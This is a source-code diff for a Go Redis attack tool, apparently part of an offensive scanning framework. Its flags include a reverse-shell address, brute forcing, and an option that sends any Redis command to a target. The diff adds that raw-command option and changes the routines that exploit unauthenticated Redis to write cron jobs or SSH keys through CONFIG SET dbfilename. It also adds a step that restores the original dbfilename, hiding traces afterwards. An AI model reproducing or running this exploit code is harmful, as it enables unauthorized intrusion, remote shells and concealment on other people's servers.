@@ -34,7 +34,7 @@ func init() {
 	RedisCmd.Flags().StringVar(&RemoteHost, "rebound", "", "Rebound shell address (eg.) 192.168.1.1:4444")
 	RedisCmd.Flags().StringVar(&ConnHost, "hostname", "", "Redis will connect this address")
 	RedisCmd.Flags().StringVar(&LoginPass, "pass", "", "set login pass")
-
+	RedisCmd.Flags().StringVar(&SQLCommand, "sql", "", "Execute redis sql command")
 }
 
 func BruteRedisByUser() {
@@ -59,7 +59,7 @@ func BruteRedisByUser() {
 			Println(Clearln + "[*] May be you want to brute? try to add --crack")
 		}
 	}
-	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "") {
+	if Hosts == "" && ConnHost != "" && (RemoteHost != "" || RemotePublicKey != "" || SQLCommand != "") {
 		var (
 			conn   net.Conn
 			status bool
@@ -75,6 +75,10 @@ func BruteRedisByUser() {
 			if err != nil {
 				Println(fmt.Sprintf("Redis UnAuth failed %v", err))
 			}
+		}
+		if SQLCommand != "" {
+			RedisExec(conn, SQLCommand)
+			return
 		}
 		if status == true {
 			RedisExploit(conn, RemoteHost, RemotePublicKey)
@@ -269,9 +273,25 @@ func RedisExploit(conn net.Conn, RemoteHost string, Filename string) {
 	}
 }
 
+func RedisExec(conn net.Conn, cmd string) {
+	if cmd != "" {
+		_, err := conn.Write([]byte(fmt.Sprintf("%s\r\n", cmd)))
+		if err != nil {
+			Println(fmt.Sprintf("[!] %v", err))
+			return
+		}
+		reply, err := RedisReply(conn)
+		if err != nil {
+			Println(fmt.Sprintf("[!] %v", err))
+			return
+		}
+		Println(fmt.Sprintf("%v", string(reply)))
+	}
+}
+
 func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
-	c, s, e := RedisWrite(conn)
-	Println(fmt.Sprintf("%v %v %v", c, s, e))
+	c, s, _ := RedisWrite(conn)
+	Println(fmt.Sprintf("[+] Redis cron %v ssh %v", c, s))
 	// 先解析RemoteHost参数
 	var (
 		remote = strings.Split(RemoteHost, ":")
@@ -324,8 +344,21 @@ func RedisCron(conn net.Conn, RemoteHost string) (bool, error) {
 					return false, err
 				}
 				if strings.Contains(reply, "OK") {
+					Println("[+] save corn success")
 					flag = true
 				}
+			}
+			// 恢复原始的dbfilename
+			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
+			if err != nil {
+				return false, err
+			}
+			reply, err = RedisReply(conn)
+			if err != nil {
+				return false, err
+			}
+			if strings.Contains(reply, "OK") {
+				Println("[+] Restore the original dbfilename")
 			}
 		}
 	}
@@ -382,6 +415,18 @@ func RedisKey(conn net.Conn, filename string) (bool, error) {
 				if strings.Contains(reply, "OK") {
 					flag = true
 				}
+			}
+			// 恢复原始的dbfilename
+			_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename dump.rdb\r\n")))
+			if err != nil {
+				return false, err
+			}
+			reply, err = RedisReply(conn)
+			if err != nil {
+				return false, err
+			}
+			if strings.Contains(reply, "OK") {
+				Println("[+] Restore the original dbfilename")
 			}
 		}
 	}
